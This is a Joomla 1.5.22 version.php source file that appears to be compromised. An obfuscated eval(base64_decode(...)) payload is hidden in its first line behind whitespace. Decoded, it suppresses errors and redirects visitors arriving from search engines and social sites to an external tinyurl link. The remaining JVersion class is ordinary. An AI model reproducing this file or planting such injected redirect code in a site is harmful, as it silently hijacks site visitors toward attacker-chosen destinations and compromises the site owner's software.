<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: version.php 19340 2010-11-03 15:00:55Z ian $
 * @package	Joomla.Framework
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */
defined('JPATH_BASE') or die();
/**
 * Version information
 *
 * @package	Joomla.Framework
 * @since	1.0
 */
class JVersion
{
	/** @var string Product */
	var $PRODUCT 	= 'Joomla!';
	/** @var int Main Release Level */
	var $RELEASE 	= '1.5';
	/** @var string Development Status */
	var $DEV_STATUS = 'Stable';
	/** @var int Sub Release Level */
	var $DEV_LEVEL 	= '22';
	/** @var int build Number */
	var $BUILD	= '';
	/** @var string Codename */
	var $CODENAME 	= 'senu takaa ama woi';
	/** @var string Date */
	var $RELDATE 	= '04-November-2010';
	/** @var string Time */
	var $RELTIME 	= '18:00';
	/** @var string Timezone */
	var $RELTZ 	= 'GMT';
	/** @var string Copyright Text */
	var $COPYRIGHT 	= 'Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.';
	/** @var string URL */
	var $URL 	= '<a href="http://www.joomla.org">Joomla!</a> is Free Software released under the GNU General Public License.';

	/**
	 *
	 *
	 * @return string Long format version
	 */
	function getLongVersion()
	{
		return $this->PRODUCT .' '. $this->RELEASE .'.'. $this->DEV_LEVEL .' '
			. $this->DEV_STATUS
			.' [ '.$this->CODENAME .' ] '. $this->RELDATE .' '
			. $this->RELTIME .' '. $this->RELTZ;
	}

	/**
	 *
	 *
	 * @return string Short version format
	 */
	function getShortVersion() {
		return $this->RELEASE .'.'. $this->DEV_LEVEL;
	}

	/**
	 *
	 *
	 * @return string Version suffix for help files
	 */
	function getHelpVersion()
	{
		if ($this->RELEASE > '1.0') {
			return '.' . str_replace( '.', '', $this->RELEASE );
		} else {
			return '';
		}
	}

	/**
	 * Compares two "A PHP standardized" version number against the current Joomla! version
	 *
	 * @return boolean
	 * @see http://www.php.net/version_compare
	 */
	function isCompatible ( $minimum ) {
		return (version_compare( JVERSION, $minimum, 'eq' ) == 1);
	}
}
